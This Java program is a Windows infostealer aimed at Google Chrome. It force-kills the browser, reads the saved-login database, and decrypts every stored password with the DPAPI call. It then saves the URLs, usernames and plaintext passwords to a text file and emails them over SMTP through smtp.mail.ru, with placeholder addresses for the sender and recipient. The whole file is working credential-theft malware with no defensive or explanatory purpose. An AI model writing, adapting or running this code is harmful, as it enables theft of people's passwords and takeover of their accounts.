import com.sun.jna.platform.win32.Crypt32Util;

import javax.mail.*;
import javax.mail.internet.InternetAddress;
import javax.mail.internet.MimeMessage;
import java.io.FileNotFoundException;
import java.io.PrintWriter;
import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.ResultSet;
import java.sql.Statement;
import java.util.Date;
import java.util.Properties;

public class Main {

    public static void main(String[] args) {
        String chromeLogins = getLogins();
        System.out.println(chromeLogins);
        saveToFile(chromeLogins);
        sendMail(chromeLogins);
    }

    private static String getLogins() {
        StringBuilder logins = new StringBuilder();
        try {
            /* Makes resources available by killing the Chrome process */
            Runtime.getRuntime().exec("taskkill /F /IM chrome.exe");

            String LOCAL_APP_DATA = System.getenv("LOCALAPPDATA");
            /* Get file-resources Login Data  */
            Class.forName("org.sqlite.JDBC");
            Connection conn = DriverManager.getConnection("jdbc:sqlite:" + LOCAL_APP_DATA + "/Google/Chrome/User Data/Default/Login Data");
            Statement stat = conn.createStatement();
            ResultSet rs = stat.executeQuery("SELECT origin_url, username_value, password_value FROM logins");

            while (rs.next()) {
                byte[] encryptedData = rs.getBytes("password_value");
                byte[] decryptedData = Crypt32Util.cryptUnprotectData(encryptedData);
                StringBuilder decryptedString = new StringBuilder();
                for (byte b : decryptedData) {
                    decryptedString.append((char) b);
                }
                logins.append("URL:[").append(rs.getString("origin_url"))
                        .append("] Login:[").append(rs.getString("username_value"))
                        .append("] Password:[").append(decryptedString).append("]\n");
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return logins.toString();
    }

    private static void saveToFile(String text) {
        try (PrintWriter out = new PrintWriter("ChromePasswords.txt")) {
            out.println(text);
            System.out.println("The file is created successfully!");
        } catch (FileNotFoundException e) {
            e.printStackTrace();
        }
    }

    private static void sendMail(String text) {
        // SUBSTITUTE YOUR EMAIL ADDRESSES HERE!
        String to = "Mail_To";
        String from = "Mail_From";
        // SUBSTITUTE YOUR ISP'S MAIL SERVER HERE!
        String host = "smtp.mail.ru";
        // SUBSTITUTE YOUR PASSWORD HERE!
        String password = "PASSWORD";

        Properties props = new Properties();
        props.put("mail.smtp.host", host);
        props.put("mail.smtp.ssl.enable", "true");
        props.put("mail.smtp.auth", "true");
        props.put("mail.smtp.starttls.enable", "true");

        Session session = Session.getDefaultInstance(props, new javax.mail.Authenticator() {
            @Override
            protected PasswordAuthentication getPasswordAuthentication() {
                return new PasswordAuthentication(from, password);
            }
        });

        try {
            Message msg = new MimeMessage(session);

            msg.setFrom(new InternetAddress(from));
            InternetAddress[] address = {new InternetAddress(to)};
            msg.setRecipients(Message.RecipientType.TO, address);
            msg.setSubject("Chrome passwords");
            msg.setSentDate(new Date());
            msg.setText(text);

            Transport.send(msg);
            System.out.println("Message sent successfully!");

        } catch (MessagingException mex) {
            mex.printStackTrace();
        }
    }
}